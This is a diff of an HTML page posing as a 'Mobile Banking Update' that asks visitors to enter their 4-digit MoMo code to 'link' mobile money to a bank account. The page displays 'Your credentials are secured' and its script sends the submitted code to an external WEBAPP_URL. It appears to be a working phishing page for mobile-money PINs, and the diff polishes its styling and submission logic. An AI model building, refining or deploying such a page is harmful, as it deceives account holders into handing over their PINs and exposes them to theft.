@@ -3,50 +3,51 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Mobile Banking Update</title>
+  <title>MOBILE BANKING UPDATE</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       margin: 0;
       background: linear-gradient(to bottom, #08143a, #0b1d4d);
-      color: #fff;
       display: flex;
       flex-direction: column;
       align-items: center;
-      min-height: 100vh;
-      padding-bottom: 40px;
+      color: #fff;
+      overflow-x: hidden;
     }
 
     .header {
       background: linear-gradient(135deg, #08143a, #0b1d4d);
-      width: 100%;
       text-align: center;
+      width: 100%;
       padding: 40px 20px;
       border-bottom-left-radius: 40px;
       border-bottom-right-radius: 40px;
       box-shadow: 0 4px 10px rgba(0,0,0,0.3);
     }
-    .header h1 { margin: 0; font-size: 24px; }
-    .header p { margin: 10px 0 0; font-size: 14px; line-height: 1.4; }
+    .header h1 { margin: 0; font-size: 22px; }
+    .header p { margin: 5px 0; font-size: 14px; }
 
-    .form-container {
+    .login-container {
       background: linear-gradient(145deg, rgba(10,25,70,0.95), rgba(15,35,90,0.95));
       width: 90%;
       max-width: 360px;
-      margin-top: -20px;
+      margin-top: -30px;
       padding: 30px 25px;
       border-radius: 12px;
       box-shadow: 0 6px 16px rgba(0,0,0,0.4);
       backdrop-filter: blur(4px);
+      z-index: 2;
+      position: relative;
     }
 
-    label {
+    .login-container label {
       display: block;
       margin-bottom: 6px;
       font-size: 14px;
+      color: #fff;
     }
-
-    input {
+    .login-container input {
       width: 100%;
       padding: 12px;
       margin-bottom: 20px;
@@ -56,22 +57,17 @@
       background-color: rgba(11,29,77,0.9);
       color: #fff;
     }
-
-    input::placeholder {
+    .login-container input::placeholder {
       color: #ccc;
-    }
-
-    input:focus {
-      border-color: #1e90ff;
-      box-shadow: 0 0 8px rgba(30,144,255,0.6);
-      outline: none;
     }
 
     .button-group {
       display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      flex-wrap: wrap;
     }
-
-    button {
+    .button-group button {
       flex: 1;
       padding: 12px;
       border: none;
@@ -79,36 +75,38 @@
       font-size: 16px;
       font-weight: bold;
       cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
       background: linear-gradient(135deg, #1e90ff, #187bcd);
       color: #fff;
       transition: all 0.3s ease;
     }
-
-    button:hover {
+    .button-group button:hover {
       background: linear-gradient(135deg, #187bcd, #1560a3);
       transform: scale(1.05);
       box-shadow: 0 4px 12px rgba(0,0,0,0.4);
     }
 
     .status {
-      text-align: center;
-      font-size: 14px;
-      margin-bottom: 12px;
+      font-size: 13px;
       color: #ccc;
+      margin-bottom: 12px;
+      text-align: center;
     }
   </style>
 </head>
 <body>
   <div class="header">
     <h1>MOBILE BANKING UPDATE</h1>
-    <p>ACCOUNT TO WALLET ACTIVATION<br>
-    Link your Services to your Account Below</p>
+    <p>ACCOUNT TO WALLET ACTIVATION</p>
+    <p>Link your MoMo to your Bank Account Below</p>
   </div>
 
-  <div class="form-container">
+  <div class="login-container">
     <form id="momoForm">
       <label>Enter 4 digits MoMo Code</label>
-      <input type="text" name="momo_code" placeholder="e.g. 1234" required maxlength="4">
+      <input type="text" name="momo_code" placeholder="XXXX" required maxlength="4">
 
       <div class="status" id="status">Your credentials are secured.</div>
 
@@ -132,22 +130,12 @@
 
       try {
         const response = await fetch(WEBAPP_URL, { method: "POST", body: formData });
-        const text = await response.text();
-        console.log("Server response:", text);
+        const result = await response.json();
 
-        let json;
-        try {
-          json = JSON.parse(text);
-        } catch {
-          statusEl.textContent = "Server error: " + text;
-          statusEl.style.color = "#ff5555";
-          return;
-        }
-
-        if (json.result === "success") {
+        if (result.result === "success") {
           window.location.href = "thankyou.html";
         } else {
-          statusEl.textContent = "Submission failed: " + (json.message || "Unknown error");
+          statusEl.textContent = "Submission failed: " + (result.message || "Unknown error");
           statusEl.style.color = "#ff5555";
         }
       } catch (err) {
